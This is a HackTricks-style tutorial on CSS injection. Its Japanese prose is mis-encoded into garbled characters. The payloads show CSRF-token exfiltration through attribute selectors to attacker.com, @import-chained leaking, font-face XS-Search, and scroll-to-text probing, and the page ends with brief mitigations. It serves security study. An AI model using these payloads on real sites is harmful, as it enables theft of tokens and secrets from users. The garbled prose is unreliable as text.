# CSS Injection

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}


## CSS Injection

### Attribute Selector

CSSã‚»ãƒ¬ã‚¯ã‚¿ã¯ã€`input`è¦ç´ ã®`name`ãŠã‚ˆã³`value`å±æ€§ã®å€¤ã«ä¸€è‡´ã™ã‚‹ã‚ˆã†ã«ä½œæˆã•ã‚Œã¦ã„ã¾ã™ã€‚å…¥åŠ›è¦ç´ ã®valueå±æ€§ãŒç‰¹å®šã®æ–‡å­—ã§å§‹ã¾ã‚‹å ´åˆã€ã‚ã‚‰ã‹ã˜ã‚å®šç¾©ã•ã‚ŒãŸå¤–éƒ¨ãƒªã‚½ãƒ¼ã‚¹ãŒèª­ã¿è¾¼ã¾ã‚Œã¾ã™:
```css
input[name=csrf][value^=a]{
background-image: url(https://attacker.com/exfil/a);
}
input[name=csrf][value^=b]{
background-image: url(https://attacker.com/exfil/b);
}
/* ... */
input[name=csrf][value^=9]{
background-image: url(https://attacker.com/exfil/9);
}
```
ã—ã‹ã—ã€ã“ã®ã‚¢ãƒ—ãƒ­ãƒ¼ãƒã¯ã€éš ã—å…¥åŠ›è¦ç´ ï¼ˆ`type="hidden"`ï¼‰ã‚’æ‰±ã†éš›ã«åˆ¶é™ã«ç›´é¢ã—ã¾ã™ã€‚éš ã—è¦ç´ ã¯èƒŒæ™¯ã‚’èª­ã¿è¾¼ã¾ãªã„ãŸã‚ã§ã™ã€‚

#### éš ã—è¦ç´ ã®ãƒã‚¤ãƒ‘ã‚¹

ã“ã®åˆ¶é™ã‚’å›é¿ã™ã‚‹ãŸã‚ã«ã€`~` ä¸€èˆ¬çš„ãªå…„å¼Ÿã‚³ãƒ³ãƒ“ãƒãƒ¼ã‚¿ã‚’ä½¿ç”¨ã—ã¦ã€æ¬¡ã®å…„å¼Ÿè¦ç´ ã‚’ã‚¿ãƒ¼ã‚²ãƒƒãƒˆã«ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚CSSãƒ«ãƒ¼ãƒ«ã¯ã€éš ã—å…¥åŠ›è¦ç´ ã®å¾Œã«ç¶šãã™ã¹ã¦ã®å…„å¼Ÿã«é©ç”¨ã•ã‚Œã€èƒŒæ™¯ç”»åƒãŒèª­ã¿è¾¼ã¾ã‚Œã‚‹ã‚ˆã†ã«ãªã‚Šã¾ã™ã€‚
```css
input[name=csrf][value^=csrF] ~ * {
background-image: url(https://attacker.com/exfil/csrF);
}
```
å®Ÿéš›ã«ã“ã®æŠ€è¡“ã‚’æ‚ªç”¨ã™ã‚‹ä¾‹ã¯ã€æä¾›ã•ã‚ŒãŸã‚³ãƒ¼ãƒ‰ã‚¹ãƒ‹ãƒšãƒƒãƒˆã«è©³è¿°ã•ã‚Œã¦ã„ã¾ã™ã€‚ã“ã¡ã‚‰ã§è¦‹ã‚‹ã“ã¨ãŒã§ãã¾ã™ [here](https://gist.github.com/d0nutptr/928301bde1d2aa761d1632628ee8f24e)ã€‚

#### CSSã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã®å‰ææ¡ä»¶

CSSã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³æŠ€è¡“ãŒåŠ¹æœçš„ã§ã‚ã‚‹ãŸã‚ã«ã¯ã€ç‰¹å®šã®æ¡ä»¶ã‚’æº€ãŸã™å¿…è¦ãŒã‚ã‚Šã¾ã™ï¼š

1. **ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã®é•·ã•**: CSSã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ãƒ™ã‚¯ã‚¿ãƒ¼ã¯ã€ä½œæˆã•ã‚ŒãŸã‚»ãƒ¬ã‚¯ã‚¿ã‚’åå®¹ã™ã‚‹ã®ã«ååˆ†ãªé•·ã•ã®ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚
2. **CSSã®å†è©•ä¾¡**: ãƒšãƒ¼ã‚¸ã‚’ãƒ•ãƒ¬ãƒ¼ãƒ åŒ–ã™ã‚‹èƒ½åŠ›ãŒå¿…è¦ã§ã‚ã‚Šã€ã“ã‚Œã¯æ–°ã—ãç”Ÿæˆã•ã‚ŒãŸãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã§CSSã®å†è©•ä¾¡ã‚’ãƒˆãƒªã‚¬ãƒ¼ã™ã‚‹ãŸã‚ã«å¿…è¦ã§ã™ã€‚
3. **å¤–éƒ¨ãƒªã‚½ãƒ¼ã‚¹**: ã“ã®æŠ€è¡“ã¯ã€å¤–éƒ¨ãƒ›ã‚¹ãƒˆã•ã‚ŒãŸç”»åƒã‚’ä½¿ç”¨ã™ã‚‹èƒ½åŠ›ã‚’å‰æã¨ã—ã¦ã„ã¾ã™ã€‚ã“ã‚Œã¯ã€ã‚µã‚¤ãƒˆã®ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒãƒªã‚·ãƒ¼ï¼ˆCSPï¼‰ã«ã‚ˆã£ã¦åˆ¶é™ã•ã‚Œã‚‹å ´åˆãŒã‚ã‚Šã¾ã™ã€‚

### ãƒ–ãƒ©ã‚¤ãƒ³ãƒ‰å±æ€§ã‚»ãƒ¬ã‚¯ã‚¿

[**ã“ã®æŠ•ç¨¿ã§èª¬æ˜ã•ã‚Œã¦ã„ã‚‹ã‚ˆã†ã«**](https://portswigger.net/research/blind-css-exfiltration)ã€**`:has`** ã¨ **`:not`** ã‚»ãƒ¬ã‚¯ã‚¿ã‚’çµ„ã¿åˆã‚ã›ã¦ã€ãƒ–ãƒ©ã‚¤ãƒ³ãƒ‰è¦ç´ ã‹ã‚‰ã§ã‚‚ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã‚’ç‰¹å®šã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚ã“ã‚Œã¯ã€CSSã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã‚’èª­ã¿è¾¼ã‚€ã‚¦ã‚§ãƒ–ãƒšãƒ¼ã‚¸ã®ä¸­èº«ãŒå…¨ãåˆ†ã‹ã‚‰ãªã„å ´åˆã«éå¸¸ã«ä¾¿åˆ©ã§ã™ã€‚\
ã¾ãŸã€ã“ã‚Œã‚‰ã®ã‚»ãƒ¬ã‚¯ã‚¿ã‚’ä½¿ç”¨ã—ã¦ã€åŒã˜ã‚¿ã‚¤ãƒ—ã®è¤‡æ•°ã®ãƒ–ãƒ­ãƒƒã‚¯ã‹ã‚‰æƒ…å ±ã‚’æŠ½å‡ºã™ã‚‹ã“ã¨ã‚‚å¯èƒ½ã§ã™ã€‚
```html
<style>
html:has(input[name^="m"]):not(input[name="mytoken"]) {
background:url(/m);
}
</style>
<input name=mytoken value=1337>
<input name=myname value=gareth>
```
ã“ã®æŠ€è¡“ã‚’æ¬¡ã®**@import**æŠ€è¡“ã¨çµ„ã¿åˆã‚ã›ã‚‹ã“ã¨ã§ã€**[**blind-css-exfiltration**](https://github.com/hackvertor/blind-css-exfiltration)**ã‚’ä½¿ç”¨ã—ã¦ã€ç›²ç›®çš„ãªãƒšãƒ¼ã‚¸ã‹ã‚‰å¤šãã®**æƒ…å ±ã‚’æµå‡ºã•ã›ã‚‹**ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚**

### @import

å‰ã®æŠ€è¡“ã«ã¯ã„ãã¤ã‹ã®æ¬ ç‚¹ãŒã‚ã‚Šã¾ã™ã®ã§ã€å‰ææ¡ä»¶ã‚’ç¢ºèªã—ã¦ãã ã•ã„ã€‚**è¤‡æ•°ã®ãƒªãƒ³ã‚¯ã‚’è¢«å®³è€…ã«é€ä¿¡ã§ãã‚‹**å¿…è¦ãŒã‚ã‚‹ã‹ã€**CSSã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³è„†å¼±ãƒšãƒ¼ã‚¸ã‚’iframeã§ãã‚‹**å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚

ã—ã‹ã—ã€**CSS `@import`**ã‚’ä½¿ç”¨ã—ã¦æŠ€è¡“ã®è³ªã‚’å‘ä¸Šã•ã›ã‚‹åˆ¥ã®å·§å¦™ãªæŠ€è¡“ãŒã‚ã‚Šã¾ã™ã€‚

ã“ã‚Œã¯æœ€åˆã«[**Pepe Vila**](https://vwzq.net/slides/2019-s3\_css\_injection\_attacks.pdf)ã«ã‚ˆã£ã¦ç¤ºã•ã‚Œã€æ¬¡ã®ã‚ˆã†ã«æ©Ÿèƒ½ã—ã¾ã™ï¼š

åŒã˜ãƒšãƒ¼ã‚¸ã‚’ä½•åº¦ã‚‚ç•°ãªã‚‹ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã§èª­ã¿è¾¼ã‚€ä»£ã‚ã‚Šã«ï¼ˆå‰ã®æ–¹æ³•ã®ã‚ˆã†ã«ï¼‰ã€**ãƒšãƒ¼ã‚¸ã‚’ä¸€åº¦ã ã‘æ”»æ’ƒè€…ã®ã‚µãƒ¼ãƒãƒ¼ã¸ã®ã‚¤ãƒ³ãƒãƒ¼ãƒˆã§èª­ã¿è¾¼ã‚€**ã“ã¨ã«ã—ã¾ã™ï¼ˆã“ã‚ŒãŒè¢«å®³è€…ã«é€ä¿¡ã™ã‚‹ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã§ã™ï¼‰ï¼š
```css
@import url('//attacker.com:5001/start?');
```
1. ã‚¤ãƒ³ãƒãƒ¼ãƒˆã¯**æ”»æ’ƒè€…ã‹ã‚‰ã®CSSã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’å—ã‘å–ã‚‹**ã“ã¨ã«ãªã‚Šã€**ãƒ–ãƒ©ã‚¦ã‚¶ã¯ãã‚Œã‚’èª­ã¿è¾¼ã‚€**ã€‚
2. æ”»æ’ƒè€…ãŒé€ä¿¡ã™ã‚‹CSSã‚¹ã‚¯ãƒªãƒ—ãƒˆã®æœ€åˆã®éƒ¨åˆ†ã¯**å†ã³æ”»æ’ƒè€…ã®ã‚µãƒ¼ãƒãƒ¼ã¸ã®åˆ¥ã®`@import`**ã§ã™ã€‚
1. æ”»æ’ƒè€…ã®ã‚µãƒ¼ãƒãƒ¼ã¯ã“ã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆã«ã¯ã¾ã å¿œç­”ã—ã¾ã›ã‚“ã€‚ãªãœãªã‚‰ã€ã„ãã¤ã‹ã®æ–‡å­—ã‚’æ¼æ´©ã•ã›ãŸå¾Œã«ã€æ¬¡ã®æ–‡å­—ã‚’æ¼æ´©ã•ã›ã‚‹ãŸã‚ã®ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã§ã“ã®ã‚¤ãƒ³ãƒãƒ¼ãƒˆã«å¿œç­”ã—ãŸã„ã‹ã‚‰ã§ã™ã€‚
3. ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã®2ç•ªç›®ã§å¤§ããªéƒ¨åˆ†ã¯**å±æ€§ã‚»ãƒ¬ã‚¯ã‚¿æ¼æ´©ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰**ã«ãªã‚Šã¾ã™ã€‚
1. ã“ã‚Œã«ã‚ˆã‚Šã€æ”»æ’ƒè€…ã®ã‚µãƒ¼ãƒãƒ¼ã«**ç§˜å¯†ã®æœ€åˆã®æ–‡å­—ã¨æœ€å¾Œã®æ–‡å­—**ãŒé€ä¿¡ã•ã‚Œã¾ã™ã€‚
4. æ”»æ’ƒè€…ã®ã‚µãƒ¼ãƒãƒ¼ãŒ**ç§˜å¯†ã®æœ€åˆã¨æœ€å¾Œã®æ–‡å­—**ã‚’å—ã‘å–ã‚‹ã¨ã€**ã‚¹ãƒ†ãƒƒãƒ—2ã§è¦æ±‚ã•ã‚ŒãŸã‚¤ãƒ³ãƒãƒ¼ãƒˆã«å¿œç­”ã—ã¾ã™**ã€‚
1. å¿œç­”ã¯**ã‚¹ãƒ†ãƒƒãƒ—2ã€3ã€4ã¨å…¨ãåŒã˜**ã§ã™ãŒã€ä»Šå›ã¯**ç§˜å¯†ã®2ç•ªç›®ã®æ–‡å­—ã¨æ¬¡ã®æœ€å¾Œã®æ–‡å­—ã‚’è¦‹ã¤ã‘ã‚ˆã†ã¨ã—ã¾ã™**ã€‚

æ”»æ’ƒè€…ã¯**ç§˜å¯†ã‚’å®Œå…¨ã«æ¼æ´©ã•ã›ã‚‹ã¾ã§ãã®ãƒ«ãƒ¼ãƒ—ã‚’ç¶šã‘ã¾ã™**ã€‚

å…ƒã®[**Pepe Vilaã®ã‚³ãƒ¼ãƒ‰ã‚’ã“ã“ã§åˆ©ç”¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™**](https://gist.github.com/cgvwzq/6260f0f0a47c009c87b4d46ce3808231) ã¾ãŸã¯ã€ã»ã¼[**åŒã˜ã‚³ãƒ¼ãƒ‰ã§ã™ãŒã‚³ãƒ¡ãƒ³ãƒˆä»˜ãã®ã‚‚ã®ã‚’ã“ã“ã§è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™**ã€‚](./#css-injection)

{% hint style="info" %}
ã‚¹ã‚¯ãƒªãƒ—ãƒˆã¯æ¯å›2æ–‡å­—ã‚’ç™ºè¦‹ã—ã‚ˆã†ã¨ã—ã¾ã™ï¼ˆæœ€åˆã‹ã‚‰ã¨æœ€å¾Œã‹ã‚‰ï¼‰ãªãœãªã‚‰ã€å±æ€§ã‚»ãƒ¬ã‚¯ã‚¿ã¯æ¬¡ã®ã‚ˆã†ãªã“ã¨ã‚’å¯èƒ½ã«ã™ã‚‹ã‹ã‚‰ã§ã™ï¼š
```css
/* value^=  to match the beggining of the value*/
input[value^="0"]{--s0:url(http://localhost:5001/leak?pre=0)}

/* value$=  to match the ending of the value*/
input[value$="f"]{--e0:url(http://localhost:5001/leak?post=f)}
```
ã“ã‚Œã¯ã‚¹ã‚¯ãƒªãƒ—ãƒˆãŒç§˜å¯†ã‚’ã‚ˆã‚Šæ—©ãæ¼ã‚‰ã™ã“ã¨ã‚’å¯èƒ½ã«ã—ã¾ã™ã€‚  
{% endhint %}

{% hint style="warning" %}
æ™‚ã€…ã€ã‚¹ã‚¯ãƒªãƒ—ãƒˆã¯**æ¥é ­è¾ + æ¥å°¾è¾ãŒã™ã§ã«å®Œå…¨ãªãƒ•ãƒ©ã‚°ã§ã‚ã‚‹ã“ã¨ã‚’æ­£ã—ãæ¤œå‡ºã—ãªã„**ã“ã¨ãŒã‚ã‚Šã€æ¥é ­è¾ã®æ–¹å‘ã«é€²ã¿ã€æ¥å°¾è¾ã®æ–¹å‘ã«æˆ»ã‚Šã€ã‚ã‚‹æ™‚ç‚¹ã§ãƒãƒ³ã‚°ã—ã¾ã™ã€‚\
å¿ƒé…ã—ãªã„ã§ãã ã•ã„ã€**å‡ºåŠ›**ã‚’ç¢ºèªã™ã‚Œã°ã€**ãã“ã«ãƒ•ãƒ©ã‚°ã‚’è¦‹ã‚‹ã“ã¨ãŒã§ãã¾ã™**ã€‚
{% endhint %}

### ãã®ä»–ã®ã‚»ãƒ¬ã‚¯ã‚¿

**CSSã‚»ãƒ¬ã‚¯ã‚¿**ã‚’ä½¿ç”¨ã—ã¦DOMã®éƒ¨åˆ†ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ä»–ã®æ–¹æ³•ï¼š

* **`.class-to-search:nth-child(2)`**: ã“ã‚Œã¯DOMå†…ã®ã€Œclass-to-searchã€ã‚¯ãƒ©ã‚¹ã‚’æŒã¤2ç•ªç›®ã®ã‚¢ã‚¤ãƒ†ãƒ ã‚’æ¤œç´¢ã—ã¾ã™ã€‚
*   **`:empty`** ã‚»ãƒ¬ã‚¯ã‚¿: ä¾‹ãˆã°ã€[**ã“ã®è§£èª¬**](https://github.com/b14d35/CTF-Writeups/tree/master/bi0sCTF%202022/Emo-Locker)**ã§ä½¿ç”¨ã•ã‚Œã¦ã„ã¾ã™**:

```css
[role^="img"][aria-label="1"]:empty { background-image: url("YOUR_SERVER_URL?1"); }
```

### ã‚¨ãƒ©ãƒ¼ã«åŸºã¥ãXS-Search

**å‚è€ƒ:** [CSSãƒ™ãƒ¼ã‚¹ã®æ”»æ’ƒ: @font-faceã®unicode-rangeã‚’æ‚ªç”¨ã™ã‚‹](https://mksben.l0.cm/2015/10/css-based-attack-abusing-unicode-range.html), [@terjanqã«ã‚ˆã‚‹ã‚¨ãƒ©ãƒ¼ã«åŸºã¥ãXS-Search PoC](https://twitter.com/terjanq/status/1180477124861407234)

å…¨ä½“ã®æ„å›³ã¯ã€**åˆ¶å¾¡ã•ã‚ŒãŸã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã‹ã‚‰ã‚«ã‚¹ã‚¿ãƒ ãƒ•ã‚©ãƒ³ãƒˆã‚’ä½¿ç”¨ã—ã€æŒ‡å®šã•ã‚ŒãŸãƒªã‚½ãƒ¼ã‚¹ï¼ˆ`favicon.ico`ï¼‰ãŒèª­ã¿è¾¼ã¾ã‚Œãªã„å ´åˆã«ã®ã¿ã€ã“ã®ãƒ•ã‚©ãƒ³ãƒˆã§ãƒ†ã‚­ã‚¹ãƒˆï¼ˆã“ã®å ´åˆã¯ã€ŒAã€ï¼‰ã‚’è¡¨ç¤ºã™ã‚‹ã“ã¨ã‚’ä¿è¨¼ã™ã‚‹**ã“ã¨ã§ã™ã€‚
```html
<!DOCTYPE html>
<html>
<head>
<style>
@font-face{
font-family: poc;
src: url(http://attacker.com/?leak);
unicode-range:U+0041;
}

#poc0{
font-family: 'poc';
}

</style>
</head>
<body>

<object id="poc0" data="http://192.168.0.1/favicon.ico">A</object>
</body>
</html>
```
1. **ã‚«ã‚¹ã‚¿ãƒ ãƒ•ã‚©ãƒ³ãƒˆã®ä½¿ç”¨**:
- ã‚«ã‚¹ã‚¿ãƒ ãƒ•ã‚©ãƒ³ãƒˆã¯ã€`<head>`ã‚»ã‚¯ã‚·ãƒ§ãƒ³å†…ã®`<style>`ã‚¿ã‚°ã‚’ä½¿ç”¨ã—ã¦`@font-face`ãƒ«ãƒ¼ãƒ«ã§å®šç¾©ã•ã‚Œã¾ã™ã€‚
- ãƒ•ã‚©ãƒ³ãƒˆã¯`poc`ã¨åä»˜ã‘ã‚‰ã‚Œã€å¤–éƒ¨ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆï¼ˆ`http://attacker.com/?leak`ï¼‰ã‹ã‚‰å–å¾—ã•ã‚Œã¾ã™ã€‚
- `unicode-range`ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã¯`U+0041`ã«è¨­å®šã•ã‚Œã€ç‰¹å®šã®Unicodeæ–‡å­—'A'ã‚’ã‚¿ãƒ¼ã‚²ãƒƒãƒˆã«ã—ã¾ã™ã€‚

2. **ãƒ•ã‚©ãƒ¼ãƒ«ãƒãƒƒã‚¯ãƒ†ã‚­ã‚¹ãƒˆã‚’æŒã¤ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆè¦ç´ **:
- `<body>`ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã«`id="poc0"`ã‚’æŒã¤`<object>`è¦ç´ ãŒä½œæˆã•ã‚Œã¾ã™ã€‚ã“ã®è¦ç´ ã¯`http://192.168.0.1/favicon.ico`ã‹ã‚‰ãƒªã‚½ãƒ¼ã‚¹ã‚’èª­ã¿è¾¼ã‚‚ã†ã¨ã—ã¾ã™ã€‚
- ã“ã®è¦ç´ ã®`font-family`ã¯ã€`<style>`ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã§å®šç¾©ã•ã‚ŒãŸ`'poc'`ã«è¨­å®šã•ã‚Œã¦ã„ã¾ã™ã€‚
- ãƒªã‚½ãƒ¼ã‚¹ï¼ˆ`favicon.ico`ï¼‰ã®èª­ã¿è¾¼ã¿ã«å¤±æ•—ã—ãŸå ´åˆã€`<object>`ã‚¿ã‚°å†…ã®ãƒ•ã‚©ãƒ¼ãƒ«ãƒãƒƒã‚¯ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ï¼ˆæ–‡å­—'A'ï¼‰ãŒè¡¨ç¤ºã•ã‚Œã¾ã™ã€‚
- å¤–éƒ¨ãƒªã‚½ãƒ¼ã‚¹ãŒèª­ã¿è¾¼ã¾ã‚Œãªã„å ´åˆã€ãƒ•ã‚©ãƒ¼ãƒ«ãƒãƒƒã‚¯ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ï¼ˆ'A'ï¼‰ã¯ã‚«ã‚¹ã‚¿ãƒ ãƒ•ã‚©ãƒ³ãƒˆ`poc`ã‚’ä½¿ç”¨ã—ã¦ãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ã•ã‚Œã¾ã™ã€‚

### ã‚¹ã‚¯ãƒ­ãƒ¼ãƒ«ãƒ†ã‚­ã‚¹ãƒˆãƒ•ãƒ©ã‚°ãƒ¡ãƒ³ãƒˆã®ã‚¹ã‚¿ã‚¤ãƒªãƒ³ã‚°

**`:target`**æ“¬ä¼¼ã‚¯ãƒ©ã‚¹ã¯ã€[CSSã‚»ãƒ¬ã‚¯ã‚¿ãƒ¼ãƒ¬ãƒ™ãƒ«4ä»•æ§˜](https://drafts.csswg.org/selectors-4/#the-target-pseudo)ã§æŒ‡å®šã•ã‚ŒãŸ**URLãƒ•ãƒ©ã‚°ãƒ¡ãƒ³ãƒˆ**ã«ã‚ˆã£ã¦ã‚¿ãƒ¼ã‚²ãƒƒãƒˆã«ã•ã‚ŒãŸè¦ç´ ã‚’é¸æŠã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚`::target-text`ã¯ã€ãƒ†ã‚­ã‚¹ãƒˆãŒãƒ•ãƒ©ã‚°ãƒ¡ãƒ³ãƒˆã«ã‚ˆã£ã¦æ˜ç¤ºçš„ã«ã‚¿ãƒ¼ã‚²ãƒƒãƒˆã«ã•ã‚Œãªã„é™ã‚Šã€è¦ç´ ã«ä¸€è‡´ã—ãªã„ã“ã¨ã‚’ç†è§£ã™ã‚‹ã“ã¨ãŒé‡è¦ã§ã™ã€‚

æ”»æ’ƒè€…ãŒ**ã‚¹ã‚¯ãƒ­ãƒ¼ãƒ«ãƒ†ã‚­ã‚¹ãƒˆ**ãƒ•ãƒ©ã‚°ãƒ¡ãƒ³ãƒˆæ©Ÿèƒ½ã‚’æ‚ªç”¨ã™ã‚‹ã“ã¨ã§ã€HTMLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã‚’é€šã˜ã¦è‡ªåˆ†ã®ã‚µãƒ¼ãƒãƒ¼ã‹ã‚‰ãƒªã‚½ãƒ¼ã‚¹ã‚’èª­ã¿è¾¼ã‚€ã“ã¨ã«ã‚ˆã‚Šã€ã‚¦ã‚§ãƒ–ãƒšãƒ¼ã‚¸ä¸Šã®ç‰¹å®šã®ãƒ†ã‚­ã‚¹ãƒˆã®å­˜åœ¨ã‚’ç¢ºèªã§ãã‚‹ã¨ã„ã†ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¸Šã®æ‡¸å¿µãŒç”Ÿã˜ã¾ã™ã€‚ã“ã®æ–¹æ³•ã¯ã€æ¬¡ã®ã‚ˆã†ãªCSSãƒ«ãƒ¼ãƒ«ã‚’æ³¨å…¥ã™ã‚‹ã“ã¨ã‚’å«ã¿ã¾ã™:
```css
:target::before { content : url(target.png) }
```
ã“ã®ã‚ˆã†ãªã‚·ãƒŠãƒªã‚ªã§ã¯ã€ãƒšãƒ¼ã‚¸ã«ã€ŒAdministratorã€ã¨ã„ã†ãƒ†ã‚­ã‚¹ãƒˆãŒå­˜åœ¨ã™ã‚‹å ´åˆã€ãƒªã‚½ãƒ¼ã‚¹ `target.png` ãŒã‚µãƒ¼ãƒãƒ¼ã‹ã‚‰ãƒªã‚¯ã‚¨ã‚¹ãƒˆã•ã‚Œã€ãƒ†ã‚­ã‚¹ãƒˆã®å­˜åœ¨ãŒç¤ºã•ã‚Œã¾ã™ã€‚ã“ã®æ”»æ’ƒã®ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã¯ã€æ³¨å…¥ã•ã‚ŒãŸCSSã‚’Scroll-to-textãƒ•ãƒ©ã‚°ãƒ¡ãƒ³ãƒˆã¨å…±ã«åŸ‹ã‚è¾¼ã‚“ã ç‰¹åˆ¥ã«ä½œæˆã•ã‚ŒãŸURLã‚’é€šã˜ã¦å®Ÿè¡Œã§ãã¾ã™:
```
http://127.0.0.1:8081/poc1.php?note=%3Cstyle%3E:target::before%20{%20content%20:%20url(http://attackers-domain/?confirmed_existence_of_Administrator_username)%20}%3C/style%3E#:~:text=Administrator
```
ã“ã“ã§ã¯ã€æ”»æ’ƒãŒHTMLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã‚’æ“ä½œã—ã¦CSSã‚³ãƒ¼ãƒ‰ã‚’é€ä¿¡ã—ã€ç‰¹å®šã®ãƒ†ã‚­ã‚¹ãƒˆã€ŒAdministratorã€ã‚’Scroll-to-text fragmentï¼ˆ`#:~:text=Administrator`ï¼‰ã‚’é€šã˜ã¦ç‹™ã£ã¦ã„ã¾ã™ã€‚ãƒ†ã‚­ã‚¹ãƒˆãŒè¦‹ã¤ã‹ã‚‹ã¨ã€æŒ‡å®šã•ã‚ŒãŸãƒªã‚½ãƒ¼ã‚¹ãŒèª­ã¿è¾¼ã¾ã‚Œã€æ”»æ’ƒè€…ã«ãã®å­˜åœ¨ã‚’çŸ¥ã‚‰ã‚Œã‚‹ã“ã¨ã«ãªã‚Šã¾ã™ã€‚

ç·©å’Œç­–ã¨ã—ã¦ã€ä»¥ä¸‹ã®ç‚¹ã«æ³¨æ„ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ï¼š

1. **åˆ¶ç´„ã•ã‚ŒãŸSTTFãƒãƒƒãƒãƒ³ã‚°**: Scroll-to-text Fragmentï¼ˆSTTFï¼‰ã¯ã€å˜èªã‚„æ–‡ã®ã¿ã‚’ãƒãƒƒãƒã•ã›ã‚‹ã‚ˆã†ã«è¨­è¨ˆã•ã‚Œã¦ãŠã‚Šã€ä»»æ„ã®ç§˜å¯†ã‚„ãƒˆãƒ¼ã‚¯ãƒ³ã‚’æ¼æ´©ã•ã›ã‚‹èƒ½åŠ›ã‚’åˆ¶é™ã—ã¦ã„ã¾ã™ã€‚
2. **ãƒˆãƒƒãƒ—ãƒ¬ãƒ™ãƒ«ã®ãƒ–ãƒ©ã‚¦ã‚¸ãƒ³ã‚°ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆã¸ã®åˆ¶é™**: STTFã¯ãƒˆãƒƒãƒ—ãƒ¬ãƒ™ãƒ«ã®ãƒ–ãƒ©ã‚¦ã‚¸ãƒ³ã‚°ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆã§ã®ã¿æ©Ÿèƒ½ã—ã€iframeå†…ã§ã¯æ©Ÿèƒ½ã—ãªã„ãŸã‚ã€ã„ã‹ãªã‚‹æ‚ªç”¨ã®è©¦ã¿ã‚‚ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«ã¨ã£ã¦ã‚ˆã‚Šç›®ç«‹ã¤ã‚‚ã®ã«ãªã‚Šã¾ã™ã€‚
